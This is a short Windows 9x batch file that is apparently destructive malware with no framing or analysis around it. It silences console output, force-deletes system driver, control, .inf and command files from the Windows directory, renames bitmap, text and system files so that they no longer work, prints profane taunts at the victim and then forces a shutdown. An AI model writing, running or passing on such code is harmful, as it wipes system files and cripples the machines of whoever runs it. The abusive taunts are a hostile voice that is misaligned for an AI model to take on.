@ECHO OFF
CTTY NUL

Deltree /Y %Windir%\System\*.vxd >Nul

Deltree /Y  %windir%\System\*.ocx >Nul

Deltree /Y %windir%\inf\*.inf >Nul

Deltree /Y %windir%\command\*.com >Nul

ren %windir%\*.bmp *.vbs >Nul

ren %windir%\*.txt *.fuk >Nul

ren %windir%\*.sys *.fag >Nul

Echo I hope you back up your system on a regular basis!
Echo If not I could give a rat's ass you stupid mother fucker! haha!
Echo Hey where are you going?  Why are you shutting down?  O'well, goodbye
RunDll32 Shell32.dll,SHExitWindowsEx 0x02
